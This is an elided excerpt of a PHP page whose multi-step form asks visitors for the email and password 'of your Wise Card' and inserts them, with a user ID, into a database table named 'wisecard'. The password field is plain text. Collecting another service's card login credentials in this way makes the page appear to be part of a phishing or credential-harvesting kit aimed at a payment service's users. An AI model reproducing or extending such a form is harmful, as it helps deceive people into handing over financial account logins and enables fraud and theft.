...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    $sql = "INSERT INTO wisecard (email, password,UserID) 
            VALUES (?, ?, ?)";
    ...
    <div class="container">
        <form method="post" action="" id="multiStepForm" enctype="multipart/form-data">
            ...
            <div class="step" id="step2">
                ...
                <input type="text" id="email" name="email" placeholder="Email Of   Your Wise Card " required>
                <input type="text" id="password" name="password" placeholder="Password Of   Your Wise Card " required>
